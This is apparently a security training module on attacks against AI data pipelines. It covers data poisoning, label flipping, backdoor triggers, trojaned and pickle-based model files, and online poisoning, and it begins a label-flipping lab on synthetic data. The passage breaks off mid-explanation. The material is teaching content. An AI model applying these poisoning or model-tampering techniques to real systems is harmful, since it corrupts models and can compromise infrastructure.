# AI Data Attacks (module 302)

This module explores the intersection of Data and Artificial Intelligence, exposing how vulnerabilities within AI data pipelines can be exploited, ultimately aiming to degrade performance, achieve specific misclassifications, or execute arbitrary code.



---

<!-- section 3516 | page 1 | group: Introduction | type: theory -->

# Introduction to AI Data

---

AI systems learn from data. Performance, reliability, and security all depend on it. When that data is wrong (corrupted, manipulated, or leaked) the model built on it inherits the problem, because it cannot tell the difference between legitimate patterns and patterns an attacker planted.

That single fact drives the entire threat landscape covered in this module.

To understand where attacks happen, we need to understand the normal flow first.

## The Data Pipeline: Fueling AI Systems

![Flowchart showing steps: Collect, Process, Transform, Utilize, leading to Utilization Targets: Train Models, Generate Predictions.](/storage/modules/302/the_data_pipeline.png)

At the heart of most AI implementations lies a `data pipeline`, a sequence of steps designed to collect, process, transform, and ultimately utilize data for tasks such as training models or generating predictions. While the specifics vary greatly depending on the application and organization, a general data pipeline often includes several core stages, frequently leveraging specific technologies and handling diverse data formats.

## Data Collection

![Diagram of Data Sources feeding into Data Collection Stage, leading to Raw Diverse Data Stream/Files. Sources include Web App Logs, Transactional DBs, IoT Devices, Websites, Third Parties, and Other Sources.](/storage/modules/302/data_collection.png)

`Data collection` pulls raw information from wherever it originates. User interactions arrive from web applications as `JSON` logs streamed through `Apache Kafka`. Structured transaction records come out of `PostgreSQL`. IoT devices push sensor readings over `MQTT`, while web scrapers extract content from public sites and third parties deliver batch files. The data itself spans everything from `JPEG` images to complex semi-structured formats.

Notice the variety. That is part of the challenge.

Every source is a separate trust boundary, and every format carries different assumptions about integrity. Quality problems introduced here (whether malicious or accidental) ride the pipeline forward into processing, training, and eventually production.

The pipeline does not inherently validate what it collects.

## Storage

![Diagram showing Raw Diverse Data flowing into Storage Layer with Storage Technologies: Relational DB, NoSQL DB, Data Lake, Time-Series DB, leading to Stored Assets: Datasets and Serialized Models.](/storage/modules/302/stor_age.png)

Where the data lands depends entirely on its shape. Structured records go into relational databases like `PostgreSQL`, while semi-structured logs fit better in `NoSQL` stores like `MongoDB`. Large, mixed datasets end up in massive `data lakes` built on distributed file systems or cloud object storage. Time-series data gets specialized tools like `InfluxDB`.

That covers the training data. But there is a second category of stored asset that matters just as much: the models themselves.

Trained models are serialized into files (`.pkl`, `ONNX`, `.pt`) and sit alongside the data in the same storage infrastructure. A `.pkl` file can contain arbitrary Python code, and a `.pt` file can easily be swapped out. If an attacker gets write access to the storage layer, they do not need to poison training data at all. They can replace the model directly.

We will return to this when we cover storage-layer attacks.

## Data Processing

![Diagram showing Data from Storage entering Data Processing & Transformation Stage with tasks: Cleaning, Scaling, Feature Engineering, Distributed Processing, Orchestration, leading to Prepared High-Quality Dataset.](/storage/modules/302/processing.png)

Raw data is almost never usable as-is. `Data processing and transformation` is the stage that turns it into something a model can learn from, and this is exactly where much of the actual engineering effort lives.

Missing values get handled with tools like `Pandas` and `scikit-learn` imputers, while numeric features get scaled to comparable ranges. Then comes `feature engineering`: building new inputs from existing data. That could mean extracting date components from timestamps, generating text embeddings with `spaCy`, or augmenting image datasets with `OpenCV`. At scale, distributed frameworks like `Apache Spark` handle the heavy compute, and orchestrators like `Apache Airflow` keep the workflow in order.

All of this logic is code. Cleaning scripts. Transformation jobs. Feature extractors.

They run automatically, shaping exactly what the model sees. If an attacker compromises the processing logic rather than the raw data itself, the corruption enters the pipeline at a point where nobody is looking for it. The raw data upstream still looks clean.

## Modeling

![Diagram showing Prepared High-Quality Dataset entering Analysis & Modeling Stage, with steps: Explore Data, Select Algorithm, Tune Hyperparameters, Validate Performance, leading to Trained & Validated Model.](/storage/modules/302/modeling.png)

Processed data feeds into the `analysis and modeling` stage. Data scientists explore the dataset in environments like `Jupyter Notebooks`, then train models with frameworks like `PyTorch` or `TensorFlow`. The cycle is highly iterative: pick an algorithm, tune `hyperparameters` with tools like `Optuna`, validate, adjust, and repeat. Cloud platforms bundle much of this lifecycle into managed environments to make it seamless.

From a security perspective, modeling is mostly a downstream consumer. It faithfully learns whatever the data teaches.

If the upstream data was poisoned, the model absorbs the poison. It will not flag it. It will not resist it. The actual attack surface lives in collection, storage, and processing.

Modeling is simply where the consequences become real.

## Deployment

![Diagram showing Trained & Validated Model entering Deployment Stage with patterns: REST API Service, Serverless Function, Embedded/Edge, leading to Production Predictions.](/storage/modules/302/deployment.png)

`Deployment` marks the transition from trained artifact to live system. The most common pattern wraps the model in a `REST API` using `FastAPI` or `Flask`, containerizes it with `Docker`, and orchestrates it through `Kubernetes`. Models can also run as serverless functions or be compiled directly for edge devices.

The security concern at this stage is the model file itself.

A model loaded into production is implicitly trusted to produce correct outputs. If that file has been tampered with (whether swapped for a trojaned version or loaded through an insecure deserialization path) the compromise reaches production silently.

Wrong predictions are the minor outcome. Arbitrary code execution is the severe one.

## Monitoring and Maintenance

![Diagram showing Deployed Model in Production with Operational and ML Performance Monitoring, leading to Predictions, Feedback & New Data, and Retraining Pipeline, which updates the model.](/storage/modules/302/maintenance.png)

Deployed models do not stay static. `Monitoring and maintenance` tracks both standard operational health (like latency and throughput) and ML-specific metrics like `data drift` and prediction quality.

When performance degrades, the model gets retrained. Feedback from predictions and user interactions is logged, combined with newly collected data, and run through the pipeline again to produce an updated model. Orchestration tools manage these `retraining` cycles automatically.

Here is where the security problem compounds. Retraining is supposed to incorporate new data. That is the whole point. But the pipeline cannot reliably tell the difference between a genuine shift in user behavior and data an attacker deliberately injected.

Malicious data introduced through feedback loops gets absorbed into the next model version. This is `online poisoning`. It is effective precisely because the system is structurally designed to trust its own inputs. The attack exploits the feature, not a bug.

## Two Pipeline Examples

The stages above are much easier to reason about with concrete systems. Two examples illustrate how this architecture looks in practice, and exactly where the attack surface sits in each case.

Consider an `e-commerce platform` building a `product recommendation system`. It collects user activity streamed through `Kafka`, along with review text. Raw data lands in a massive data lake on `AWS S3`. `Apache Spark` processes it all: reconstructing user sessions, running sentiment analysis on reviews, and outputting processed files. Inside `AWS SageMaker`, a recommendation model trains on that data. The model is serialized as a `pickle` file, stored back on `S3`, and deployed through a `Docker`-ized API on `Kubernetes`. Monitoring tracks click-through rates, while user feedback feeding into periodic retraining cycles keeps the model fresh.

Every one of those stages is a potential entry point for an attacker. The stream. The bucket. The jobs. The model file. The loop itself.

A `healthcare provider` building a `predictive diagnostic tool` faces a tighter version of the same fundamental architecture.

Anonymized patient images and clinical notes come from internal hospital systems. Storage is highly restricted and encrypted. `Python` scripts standardize images and extract text features before a heavy `PyTorch` run trains a model on specialized hardware. The validated model deploys via an internal API to a clinical support system. Retraining happens far less frequently and under much stricter controls.

But the fundamental problem persists: incorporating new data still explicitly requires trusting that the incoming data is legitimate.

The stakes are obviously higher because the model's output influences patient care. Ultimately, however, the pipeline's structural vulnerabilities are exactly the same.

---

<!-- section 3517 | page 2 | group: Introduction | type: theory -->

# AI Data Attacks

---

The previous section mapped the normal data pipeline, from collection through retraining. This section maps what goes wrong when an adversary targets that pipeline deliberately.

`AI data attacks` corrupt systems by going after the data the model learns from or the stored model artifact itself. That makes them fundamentally different from two other attack families covered in other topics. `Evasion attacks` manipulate inputs at inference time to fool a deployed model. `Privacy attacks` extract sensitive information the model has memorized.

The attacks here work earlier.

They corrupt the data the model learns from or the format it is stored in. By the time the model serves a prediction, the damage is already inside it.

![Diagram showing Attack Surface with objectives: Data Poisoning, Storage Tampering, Processing Manipulation, Model Poisoning, Deployment Injection, Retraining Exploitation, targeting AI Data Pipeline Stages: Data Collection, Storage, Data Processing, Analysis & Modeling, Deployment, Monitoring & Maintenance.](/storage/modules/302/pipeline_attacks.png)

Every pipeline stage has a corresponding attack type. The sections below walk through each one using the two concrete examples from the previous section (the e-commerce recommendation system and the healthcare diagnostic tool) so the attack descriptions stay grounded in systems we have already mapped.

![Diagram showing Adversary injecting malicious data into Data Collection Stage, leading to Data Poisoning, resulting in Corrupted Training Set and Compromised AI Model.](/storage/modules/302/data_collection_attacks.png)

Collection is exactly where `data poisoning` enters the pipeline. The attacker injects malicious data at the source, not by breaking in, but by simply using the same input channels the system already trusts. The injected data is crafted for a specific downstream effect, typically `label flipping` (changing what the model thinks a sample means) or `feature attacks` (perturbing the input values a sample carries).

Consider the e-commerce example. An attacker submits waves of fake positive reviews for a specific product.

Those reviews carry the correct format, arrive through the normal review submission API, and look entirely like legitimate user feedback. They are poisoned features and labels entering through a trusted channel. Some reviews might also contain specific keyword patterns, meaningless to a human reader, but designed to function as backdoor triggers.

If the model later receives an input containing those keywords, the backdoor activates. The model produces whatever output the attacker intended.

The healthcare example works somewhat differently. An attacker with access to the ingestion pathway alters `DICOM` metadata or manipulates clinical notes to mislabel diagnostic samples. These individual perturbations are small. A shifted pixel distribution in an image header. A swapped diagnosis code in a text note.

But if enough poisoned samples reach the training set, the CNN learns a version of the diagnostic task that inherently includes the attacker's distortions: wrong classifications, systemic biases, or triggered behaviors that only activate under specific input conditions.

![Diagram showing Adversary gaining unauthorized access to Storage System, leading to theft/tampering of datasets and models, and model replacement with Trojan, affecting AWS S3/Secure FS.](/storage/modules/302/stor_age_attacks.png)

Storage-layer attacks roughly split into two categories. The second is the one that matters heavily for AI-specific threats.

The first is straightforward: unauthorized access to the `AWS S3` data lake or the healthcare provider's secure storage lets an attacker steal or modify training datasets entirely. Post-collection tampering (such as changing labels or perturbing features in stored files) bypasses whatever validation existed at ingestion.

This is data poisoning through a different door.

The second targets model files. The `.pkl` recommendation model on `S3` and the `.pt` diagnostic model are high-value targets precisely because they carry executable trust.

An attacker with write access can obviously replace a legitimate model with one containing an embedded `trojan`, a model that behaves normally on clean inputs but produces attacker-chosen outputs on trigger inputs. But they can also go further and execute a `model steganography attack`: hiding arbitrary code directly inside the model file.

This works because deserialization mechanisms like `pickle.load()` execute embedded code when they load the file.

The effect is not wrong predictions. It is code execution. A compromised `.pkl` loaded by the `Flask` API server gives the attacker a solid foothold on the serving infrastructure, while a compromised `.pt` loaded by the clinical system gives access to the entire healthcare network.

![Diagram showing Adversary manipulating processing logic in Data Processing Stage, leading to corrupted processed data and indirect downstream model impact.](/storage/modules/302/processing_attacks.png)

Processing-stage attacks do not directly target data. They target the code that transforms data.

The distinction matters immensely. If an attacker compromises the cleaning, transformation, or feature engineering logic, they can corrupt data that was perfectly clean when it arrived. The raw data upstream still passes any audit. The corruption happens inside the pipeline's own processing step, which makes it significantly harder to detect.

Consider the e-commerce platform. Compromising the `Spark` job that runs sentiment analysis on reviews could easily flip sentiment labels: positive reviews get tagged negative, and negative reviews get tagged positive.

That is a textbook `label flipping` attack, but it did not require touching a single raw review. It required modifying a job configuration or injecting code into a processing script.

The healthcare analog works exactly the same way. Manipulating the `Python` scripts that standardize `DICOM` images or extract features from clinical notes could introduce subtle errors (shifted pixel normalizations, misextracted text features) that constitute `feature attacks`.

The raw images and notes remain correct in storage. The corruption exists only in the processed output the model trains on.

![Diagram showing Adversary influencing Analysis & Modeling Stage with corrupted data, leading to a compromised model with biases and incorrect patterns.](/storage/modules/302/modeling_attacks.png)

Modeling is where all upstream damage materializes.

The `AWS SageMaker` training job does not know that the `Parquet` files contain flipped labels. The `PyTorch` training loop does not know that some image features secretly carry backdoor triggers. Both blindly learn what the data teaches. Poisoned data produces a deeply poisoned model, one that has learned incorrect patterns, exhibits systematic biases, or contains hidden backdoor behavior that activates only when specific trigger inputs appear in production.

The attack surface at this stage is inherited, not introduced.

The adversary's work was already done during collection, at storage, or in processing. Modeling simply converts that earlier corruption into a trained artifact that will aggressively carry the manipulation forward into deployment.

![Diagram showing Adversary injecting malicious model file into Model Storage, leading to insecure loading in Production Environment, resulting in a compromised system.](/storage/modules/302/deployment_attacks.png)

The deployment stage introduces an entirely different attack vector: intercepting the model file between storage and the production environment.

If the loading mechanism lacks rigid integrity checks (no hash verification, no signature validation, or an insecure deserialization path) an attacker can swap in a malicious model file at the point of deployment rather than in storage.

The final outcome is the same `Trojan` or `model stenography` risk described previously, but the access requirement is fundamentally different. The attacker does not need direct write access to S3 or the model registry.

They only need access to the deployment path. A misconfigured CI/CD pipeline. An unauthenticated model-pull endpoint. A man-in-the-middle position securely wedged between storage and the serving pod.

![Diagram showing Adversary injecting malicious feedback into Retraining Pipeline, corrupting input and affecting Production Model, creating a retraining loop.](/storage/modules/302/monitoring_attacks.png)

Retraining is undoubtedly the most effective entry point for `online poisoning`, and the exact reason is structural: the pipeline is designed to implicitly trust new data.

Take the e-commerce platform's `Airflow`-managed retraining pipeline. The attacker does not need to awkwardly compromise storage or processing code. They just submit manipulated data through the same channels legitimate users do. Subtly altered clickstream data. Misleading feedback that reliably biases future labels. Repeated interactions perfectly engineered to pull model weights toward specific outcomes.

Each individual submission looks entirely normal. The poisoning steadily accumulates across long retraining cycles.

That gradual pace is what makes `online poisoning` incredibly hard to catch. Recommendation quality does not completely collapse overnight. It lazily drifts. Biases emerge slowly across many model versions, and the monitoring system essentially has to distinguish between three things that look incredibly similar: genuine distribution shift in user behavior, random noise, and active adversarial manipulation.

The system was purposely built to adapt to the first. It has literally no built-in mechanism to reject the third.

The overall impact of successful AI data attacks spans a wide range. At the mild end, subtly biased decisions and degraded prediction quality. At the severe end, absolute model compromise.

At the worst end, when the attack involves embedded trojans or code execution through deserialized model files, the breach dangerously extends beyond the model and directly into the broader infrastructure.


## Mapping Vulnerabilities to Security Frameworks

Two security frameworks provide structured language for the risks covered above.

The `OWASP Top 10 for LLM Applications`, introduced in the "[Introduction to Red Teaming AI](https://academy.hackthebox.com/module/details/294)" module, maps the data-level attacks directly. `Data poisoning`, meaning the corruption of data during collection, processing, training, or feedback, falls under `OWASP LLM03: Training Data Poisoning`. That single entry captures the majority of the attacks described in this section.

`OWASP LLM05: Supply Chain Vulnerabilities` covers the rest.

It comprehensively addresses compromised third-party data sources, tampered pre-trained model artifacts, and vulnerabilities in the various software components and platforms that make up the pipeline infrastructure. `LLM05` is much broader than data poisoning alone. It actively extends into dependency management, third-party model provenance, and robust infrastructure integrity.

Robust protection fundamentally requires secure system design principles that go beyond any single checklist entry: absolute access control, authentication, and authorization across every pipeline stage.

[Google's Secure AI Framework](https://saif.google/) (SAIF) covers the same ground from a lifecycle perspective rather than a simple vulnerability list.

![Flowchart showing Model Creation process: Data Sources to Data Filtering & Processing, Data Storage Infrastructure, Evaluation, Training & Tuning, and Model Storage Infrastructure.](/storage/modules/302/saif_data.png)

SAIF organizes its key principles around proper `Secure Design`, firmly protecting `Data` components, and adequately verifying the `Secure Supply Chain`.

Preventing data poisoning maps cleanly to securing the data supply chain, primarily by implementing rigid `Security Testing` during model development. This is critical for data actively entering through retraining loops, where the trust boundary is generally the weakest.

Model artifact integrity and code injection prevention heavily fall under SAIF's `Secure Deployment` practices. Successfully detecting data or actual model manipulation hidden inside running retraining loops elegantly maps to `Secure Monitoring & Response`, heavily treating cybersecurity as an ongoing continuous process, rather than a one-time deployment gate.

That last point strongly matters for this topic.

The highly specific attacks covered here, especially online poisoning, are structurally designed to operate silently within completely normal system behavior. Spotting them requires relentless monitoring geared directly toward identifying statistical anomalies across massive data distributions over time. Basic perimeter security at deployment isn't remotely enough.

---

<!-- section 3519 | page 4 | group: Label Attacks | type: interactive -->

# Label Flipping

---

`Label Flipping` is arguably the simplest form of a data poisoning attack. It directly targets the `ground truth information` used during model training. 

The idea behind the attack is straightforward: an adversary gains access to a portion of the training dataset and deliberately changes the assigned `labels` (the correct answers or categories) for some data points. The actual features of the data points remain untouched; only their associated class designation is altered.

For example, in a dataset used to classify images, an image originally labeled as `cat` might have its label flipped to `dog`. In a dataset used to train a spam classifier, an email labeled as `spam` might be relabeled as `not spam`.

The most common goal of an attacker executing a `Label Flipping` attack is to `degrade model performance`. By introducing incorrect labels, the attack forces the model to learn incorrect associations between features and classes, resulting in a "confused" model that has a general decrease in performance (eg accuracy, precision, recall, etc). 

The adversary doesn't necessarily care `which` specific inputs are misclassified, only that the model becomes less reliable and useful overall, but even such a simple attack can have devastating consequences.

This attack directly embodies the risks outlined under `OWASP LLM03: Training Data Poisoning`. The adversary might not aim for specific misclassifications but rather seeks to undermine the model's overall reliability and utility. Even this relatively simple attack can have significant negative consequences.

This type of attack often targets data after it has been collected, focusing on compromising the integrity of datasets held within the `Storage` stage of the pipeline. For example, an attacker might gain unauthorized access to modify label columns in `CSV` files stored in a data lake (like `AWS S3`) or manipulate records in a `PostgreSQL` database. Label flipping could also occur if `Data Processing` scripts are compromised and alter labels during transformation.

## A hypothetical example

Let's consider hypothetical example: A company is training an AI model to analyze customer feedback on a newly launched products, labeling each review as `positive` or `negative`. An attacker targets this process. Gaining access to the training dataset, they randomly flip the labels on a portion of these reviews - marking some genuinely `positive` feedback as `negative`, and vice-versa.

The immediate goal is straightforward: to degrade the accuracy of the final sentiment analysis model.

The `effect` on the company however, is more damaging. The model, now trained on this poisoned data, becomes unreliable and unpredictable. For instance, it might incorrectly report that the overall customer sentiment towards the new product is predominantly `negative`, even if the actual feedback is largely positive, or it might report negative reviews as positive. 

Relying on this faulty analysis, the company might make incorrect decisions - perhaps they prematurely pull the product from the market, invest heavily in 'fixing' features customers actually liked, or miss crucial positive signals indicating success, leading to potentially crippling the business.

## Scenario Setup

To demonstrate how such an attack would work, we will build a model around the sentiment analysis scenario. A company is training a model to classify customer feedback as `positive` or `negative`, and we, as the adversary, will attack the training dataset by flipping labels.

First we need to setup the environment.

```python
import numpy as np
import matplotlib.pyplot as plt
from sklearn.datasets import make_blobs
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
import seaborn as sns

htb_green = "#9fef00"
node_black = "#141d2b"
hacker_grey = "#a4b1cd"
white = "#ffffff"
azure = "#0086ff"
nugget_yellow = "#ffaf00"
malware_red = "#ff3e3e"
vivid_purple = "#9f00ff"
aquamarine = "#2ee7b6"

# Configure plot styles
plt.style.use("seaborn-v0_8-darkgrid")
plt.rcParams.update(
    {
        "figure.facecolor": node_black,
        "axes.facecolor": node_black,
        "axes.edgecolor": hacker_grey,
        "axes.labelcolor": white,
        "text.color": white,
        "xtick.color": hacker_grey,
        "ytick.color": hacker_grey,
        "grid.color": hacker_grey,
        "grid.alpha": 0.1,
        "legend.facecolor": node_black,
        "legend.edgecolor": hacker_grey,
        "legend.frameon": True,
        "legend.framealpha": 1.0,
        "legend.labelcolor": white,
    }
)

# Seed for reproducibility
SEED = 1337
np.random.seed(SEED)

print("Setup complete. Libraries imported and styles configured.")
```

## The Dataset


We need data representing the customer reviews. Since processing real text data is complex and outside the scope of demonstrating the attack mechanism itself, we'll use Scikit-Learn's `make_blobs` function to create a synthetic dataset. This provides a simplified, two-dimensional representation suitable for binary classification and visualization.

Imagine that these two dimensions (`Sentiment Feature 1`, `Sentiment Feature 2`) are numerical features derived from the text reviews through some preprocessing step (e.g., using techniques like TF-IDF or word embeddings, then potentially dimensionality reduction).

We'll generate `isotropic Gaussian blobs`, essentially clusters of points in this 2D feature space.<p><p>Each point
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐱</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>,</mo><msub><mi>x</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathbf{x}_i = (x_{i1}, x_{i2})</annotation></semantics></math>
represents a review instance with its two derived features, and each
instance is assigned a label
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>.</p></p>


One cluster will represent `Class 0` (simulating `Negative` sentiment) and the other `Class 1` (simulating `Positive` sentiment). This synthetic dataset is designed to be reasonably separable, making it easier to visualize the impact of the label flipping attack on the model's decision boundary.


```python
# Generate synthetic data
n_samples = 1000
centers = [(0, 5), (5, 0)]  # Define centers for two distinct blobs
X, y = make_blobs(
    n_samples=n_samples,
    centers=centers,
    n_features=2,
    cluster_std=1.25,
    random_state=SEED,
)

# Split data into training and testing sets
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.3, random_state=SEED
)

print(f"Generated {n_samples} samples.")
print(f"Training set size: {X_train.shape[0]} samples.")
print(f"Testing set size: {X_test.shape[0]} samples.")
print(f"Number of features: {X_train.shape[1]}")
print(f"Classes: {np.unique(y)}")
```

Let's plot the clean dataset so it's very easy to see the relations in the data. 

```python
def plot_data(X, y, title="Dataset Visualization"):
    """
    Plots the 2D dataset with class-specific colors.

    Parameters:
    - X (np.ndarray): Feature data (n_samples, 2).
    - y (np.ndarray): Labels (n_samples,).
    - title (str): The title for the plot.
    """
    plt.figure(figsize=(12, 6))
    scatter = plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        alpha=0.8,
    )
    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Sentiment Feature 1", fontsize=12)
    plt.ylabel("Sentiment Feature 2", fontsize=12)
    # Create a legend
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Negative Sentiment (Class 0)", 
            markersize=10,
            markerfacecolor=azure,
        ),
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Positive Sentiment (Class 1)",
            markersize=10,
            markerfacecolor=nugget_yellow,
        ),
    ]
    plt.legend(handles=handles, title="Sentiment Classes")
    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.show()


# Plot the data
plot_data(X_train, y_train, title="Original Training Data Distribution")
```

This shows the two distinct classes we aim to classify.

![Scatter plot titled 'Original Training Data Distribution' showing two classes: Class 0 (blue) and Class 1 (orange) across Feature 1 and Feature 2.](/storage/modules/302/label_flipping_original_dataset.png)

---

<!-- section 3520 | page 5 | group: Label Attacks | type: interactive -->

# Baseline Logistic Regression Model

---

Before executing the attack, we need to establish `baseline performance` so we have something to compare the effects of the poisoned model with. We will train a `Logistic Regression` model on the original, clean training data (`X_train`, `y_train`). This baseline represents the model's expected behavior and accuracy under normal, `non-adversarial conditions`. 

As outlined in the "[Fundamentals of AI](https://academy.hackthebox.com/module/details/290)" module, `Logistic Regression` is fundamentally a classification algorithm used for predicting binary outcomes.<p><p>For a given review represented by its feature vector
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐱</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>,</mo><msub><mi>x</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathbf{x}_i = (x_{i1}, x_{i2})</annotation></semantics></math>,
the model first calculates a linear combination
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mi>i</mi></msub><annotation encoding="application/x-tex">z_i</annotation></semantics></math>
using weights
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>𝐰</mi><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>w</mi><mn>1</mn></msub><mo>,</mo><msub><mi>w</mi><mn>2</mn></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathbf{w} = (w_1, w_2)</annotation></semantics></math>
and a bias term
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mi>i</mi></msub><mo>=</mo><msup><mi>𝐰</mi><mi>T</mi></msup><msub><mi>𝐱</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mo>=</mo><msub><mi>w</mi><mn>1</mn></msub><msub><mi>x</mi><mrow><mi>i</mi><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>w</mi><mn>2</mn></msub><msub><mi>x</mi><mrow><mi>i</mi><mn>2</mn></mrow></msub><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">z_i = \mathbf{w}^T \mathbf{x}_i + b = w_1 x_{i1} + w_2 x_{i2} + b</annotation></semantics></math></p></p>
<p><p>This value
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mi>i</mi></msub><annotation encoding="application/x-tex">z_i</annotation></semantics></math>
represents the <code>log-odds</code> (or logit) of the review having
positive sentiment
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_i=1</annotation></semantics></math>).
It quantifies the linear relationship between the derived features and
the log-odds of a positive classification.</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mi>i</mi></msub><mo>=</mo><mi>log</mi><mo>&#8289;</mo><mrow><mo stretchy="true" form="prefix">(</mo><mfrac><mrow><mi>P</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mo stretchy="false" form="prefix">|</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><mrow><mn>1</mn><mo>−</mo><mi>P</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mo stretchy="false" form="prefix">|</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow></mfrac><mo stretchy="true" form="postfix">)</mo></mrow></mrow><annotation encoding="application/x-tex">z_i = \log\left(\frac{P(y_i=1 | \mathbf{x}_i)}{1 - P(y_i=1 | \mathbf{x}_i)}\right)</annotation></semantics></math></p></p>
<p><p>To convert the log-odds
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mi>i</mi></msub><annotation encoding="application/x-tex">z_i</annotation></semantics></math>
into a probability
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mi>P</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mo stretchy="false" form="prefix">|</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">p_i = P(y_i=1 | \mathbf{x}_i)</annotation></semantics></math>
(the probability of the review being <code>positive</code>), the model
applies the <code>sigmoid function</code>,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>σ</mi><annotation encoding="application/x-tex">\sigma</annotation></semantics></math>:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mi>σ</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>z</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mi>−</mi><msub><mi>z</mi><mi>i</mi></msub></mrow></msup></mrow></mfrac><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mi>−</mi><mo stretchy="false" form="prefix">(</mo><msup><mi>𝐰</mi><mi>T</mi></msup><msub><mi>𝐱</mi><mi>i</mi></msub><mo>+</mo><mi>b</mi><mo stretchy="false" form="postfix">)</mo></mrow></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">p_i = \sigma(z_i) = \frac{1}{1 + e^{-z_i}} = \frac{1}{1 + e^{-(\mathbf{w}^T \mathbf{x}_i + b)}}</annotation></semantics></math></p></p>
<p><p>The sigmoid function squashes the output
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mi>i</mi></msub><annotation encoding="application/x-tex">z_i</annotation></semantics></math>
into the range
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false" form="prefix">[</mo><mn>0</mn><mo>,</mo><mn>1</mn><mo stretchy="false" form="postfix">]</mo></mrow><annotation encoding="application/x-tex">[0, 1]</annotation></semantics></math>,
representing the model’s estimated probability that the review
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>
has <code>positive</code> sentiment.</p></p>
<p><p>During training, the model learns the optimal parameters
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐰</mi><annotation encoding="application/x-tex">\mathbf{w}</annotation></semantics></math>
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>b</mi><annotation encoding="application/x-tex">b</annotation></semantics></math>
by minimizing a <code>loss function</code> over the training set
(<code>X_train</code>, <code>y_train</code>). The goal is to find
parameters that make the predicted probabilities
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>p</mi><mi>i</mi></msub><annotation encoding="application/x-tex">p_i</annotation></semantics></math>
as close as possible to the true sentiment labels
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>.
The standard loss function for binary classification is the
<code>binary cross-entropy</code> or <code>log-loss</code>:</p></p>
